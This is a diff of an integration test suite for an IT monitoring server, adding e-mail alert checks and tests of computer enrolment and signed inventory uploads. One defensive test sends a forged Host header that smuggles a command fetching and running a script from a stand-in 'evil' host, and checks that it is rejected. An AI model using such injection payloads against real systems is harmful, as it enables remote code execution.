@@ -8,11 +8,12 @@ import os from 'node:os';
 import path from 'node:path';
 import crypto from 'node:crypto';
 import { fileURLToPath } from 'node:url';
+import { smtpMock, bodyOf, subjectOf } from './smtp-mock.mjs';
 
 const ROOT = fileURLToPath(new URL('..', import.meta.url));
 const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'vigia-it-'));
 const MASTER = 'it-master-secret', PASS = 'it-pass', ACK = 'it-ack-secret';
-let srv, aux, port, auxPort;
+let srv, aux, port, auxPort, smtp;
 const hooks = [], prompts = [];
 
 const freePort = () => new Promise(r => { const s = http.createServer().listen(0, '127.0.0.1', () => { const p = s.address().port; s.close(() => r(p)); }); });
@@ -39,15 +40,18 @@ before(async () => {
     if (q.url === '/api/generate') { const j = JSON.parse(b); prompts.push(j); return r.end(JSON.stringify({ response: `<think>hmm</think>Draft #${prompts.length}` })); }
     r.end('ok');
   }); }).listen(auxPort, '127.0.0.1');
+  smtp = smtpMock({ user: 'mailer', pass: 'mail-pass' });
+  const smtpPort = await smtp.listen();
   fs.writeFileSync(path.join(dir, 'inventory.json'), JSON.stringify([{ id: 'shop', client: 'ACME', name: 'Shop', url: `http://127.0.0.1:${auxPort}/`, criticality: 'high', backups: [{ id: 'db' }] }]));
   ({ p: srv } = await start({
     PORT: String(port), DASH_PASS: PASS, CHECKIN_SECRET: MASTER, ACK_SECRET: ACK, PUBLIC_URL: `http://127.0.0.1:${port}`, CANARY_DAYS: '0',
     WEBHOOK_URL: `http://127.0.0.1:${auxPort}/hook`, CONNECTIVITY_URLS: `http://127.0.0.1:${auxPort}/ok`,
     OLLAMA_MODEL: 'mock-model', OLLAMA_URL: `http://127.0.0.1:${auxPort}`,
+    SMTP_HOST: '127.0.0.1', SMTP_PORT: String(smtpPort), SMTP_USER: 'mailer', SMTP_PASS: 'mail-pass', MAIL_FROM: 'Vigía <vigia@it.example>', MAIL_TO: 'tech@it.example, boss@it.example',
     VIGIA_INV: path.join(dir, 'inventory.json'), VIGIA_STATE: path.join(dir, 'state.json'), VIGIA_PUSHED: path.join(dir, 'pushed.json'), VIGIA_WORDFENCE: path.join(dir, 'wf.json'),
   }));
 });
-after(() => { srv?.kill(); aux?.close(); fs.rmSync(dir, { recursive: true, force: true }); });
+after(() => { srv?.kill(); aux?.close(); smtp?.server.close(); fs.rmSync(dir, { recursive: true, force: true }); });
 
 const url = p => `http://127.0.0.1:${port}${p}`;
 const auth = { authorization: `Basic ${Buffer.from(`vigia:${PASS}`).toString('base64')}`, 'x-vigia-ui': '1' };
@@ -102,7 +106,71 @@ test('acknowledge links: bound to the alert, expiring, tamper-proof', async () =
 test('test alert tells the truth about delivery', async () => {
   const r = await fetch(url('/api/test'), { method: 'POST', headers: auth });
   assert.equal(r.status, 200);
-  assert.equal((await r.json()).sent, 1);
+  assert.equal((await r.json()).sent, 2, 'webhook and e-mail');
+  const mail = smtp.mails.at(-1);
+  assert.deepEqual(mail.to, ['tech@it.example', 'boss@it.example']);
+  assert.match(subjectOf(mail), /^P1 Vigía/);
+  assert.match(mail.data, /^X-Priority: 1$/m);
+  assert.match(bodyOf(mail), /Dashboard: http:\/\/127\.0\.0\.1/);
+});
+
+test('computers: install line, enrolment, signed Windows inventory, findings', async () => {
+  const J = { ...auth, 'content-type': 'application/json' };
+  assert.equal((await fetch(url('/api/enroll-token'), { method: 'POST', headers: { authorization: auth.authorization }, body: '{}' })).status, 403, 'CSRF header required');
+  const t = await (await fetch(url('/api/enroll-token'), { method: 'POST', headers: J, body: JSON.stringify({ client: 'Gestoría Ruiz' }) })).json();
+  assert.match(t.commands.unix, /^curl -fsSL http:\/\/127\.0\.0\.1:\d+\/agent\/install\.sh \| sudo sh -s -- http/);
+  assert.ok(t.commands.windows.includes(`$env:VIGIA_TOKEN='${t.token}'`));
+  for (const f of ['install.sh', 'vigia-collect.sh', 'vigia-agent.ps1']) assert.equal((await fetch(url(`/agent/${f}`))).status, 200, `${f} is public`);
+  assert.equal((await fetch(url('/agent/../.env'))).status, 401);
+
+  const machineId = crypto.createHash('sha256').update('guid-1').digest('hex');
+  const enroll = body => fetch(url('/api/enroll'), { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(body) });
+  assert.equal((await enroll({ token: `${t.token}x`, host: 'PC-1', machineId })).status, 401);
+  const r = await enroll({ token: t.token, host: 'RECEPCION', machineId, platform: 'windows' });
+  assert.equal(r.status, 201);
+  const e = await r.json();
+  assert.equal(e.asset, 'gestoria-ruiz-recepcion');
+  assert.equal(e.key, crypto.createHmac('sha256', MASTER).update(`vigia-asset:${e.asset}`).digest('hex'));
+  const again = await (await enroll({ token: t.token, host: 'RECEPCION', machineId })).json();
+  assert.deepEqual([again.asset, again.created], [e.asset, false], 'the same computer twice is one asset');
+
+  const body = JSON.stringify({ host: 'RECEPCION', parts: [
+    { kind: 'os', id: 'windows', productName: 'Windows 10 Pro', displayVersion: '22H2', build: 19045, edition: 'Professional' },
+    { kind: 'av', products: [] },
+    { kind: 'software', items: [{ name: 'WinRAR 6.02 (64-bit)', version: '6.02' }, { name: 'Notepad', version: '1' }] },
+    { kind: 'listening', ports: [{ proto: 'tcp', addr: '0.0.0.0', port: 3389, process: 'svchost' }] },
+    { kind: 'patches', lastInstalled: new Date(Date.now() - 120 * 864e5).toISOString(), id: 'KB1' },
+  ] });
+  const p = `/api/inventory/${e.asset}`, ts = Math.floor(Date.now() / 1000);
+  const pr = await fetch(url(p), { method: 'POST', headers: { 'x-vigia-timestamp': String(ts), 'x-vigia-signature': sign(e.key, ts, p, body) }, body });
+  assert.equal(pr.status, 200);
+  assert.equal((await pr.json()).software, 2);
+  let S;
+  for (let i = 0; i < 40; i++) {
+    S = await (await fetch(url('/api/state'), { headers: auth })).json();
+    if (S.alerts.some(a => a.key === `mach:av:${e.asset}`)) break;
+    await new Promise(res => setTimeout(res, 100));
+  }
+  const keys = S.alerts.filter(a => a.asset === e.asset).map(a => `${a.key.split(':').slice(0, 2).join(':')}:${a.prio}`);
+  for (const k of ['mach:av:P2', 'mach:patch:P2', 'mach:risky:P3', 'enroll:']) assert.ok(keys.some(x => x.startsWith(k)), `${k} in ${keys}`);
+  const a = S.inventory.find(x => x.id === e.asset);
+  assert.deepEqual([a.client, a.machine, a.criticality], ['Gestoría Ruiz', 'RECEPCION', 'medium']);
+  assert.equal(S.pushed[e.asset].machine.os, 'Windows 10 22H2 (Professional)');
+  assert.equal(S.pushed[e.asset].machine.listening[0].port, 3389);
+  assert.equal(S.notify.email, true);
+
+  // a later push without antivirus or patch data leaves those alerts open
+  const partial = JSON.stringify({ host: 'RECEPCION', parts: [{ kind: 'os', id: 'windows', productName: 'Windows 10 Pro', displayVersion: '22H2', build: 19045 }] });
+  const ts2 = ts + 1;
+  assert.equal((await fetch(url(p), { method: 'POST', headers: { 'x-vigia-timestamp': String(ts2), 'x-vigia-signature': sign(e.key, ts2, p, partial) }, body: partial })).status, 200);
+  await new Promise(res => setTimeout(res, 1200));
+  S = await (await fetch(url('/api/state'), { headers: auth })).json();
+  assert.ok(S.alerts.some(x => x.key === `mach:av:${e.asset}`), 'still open');
+
+  // the address ends up in a shell command: a forged Host header never gets there (PUBLIC_URL wins; without it, anything but a plain URL is refused)
+  const bad = await new Promise(res => http.request({ host: '127.0.0.1', port, path: '/api/enroll-token', method: 'POST',
+    headers: { ...J, host: "x';curl evil|sh;'" } }, r => { let d = ''; r.on('data', c => { d += c; }).on('end', () => res(d)); }).end(JSON.stringify({ client: 'A' })));
+  assert.ok(!bad.includes('evil'));
 });
 
 
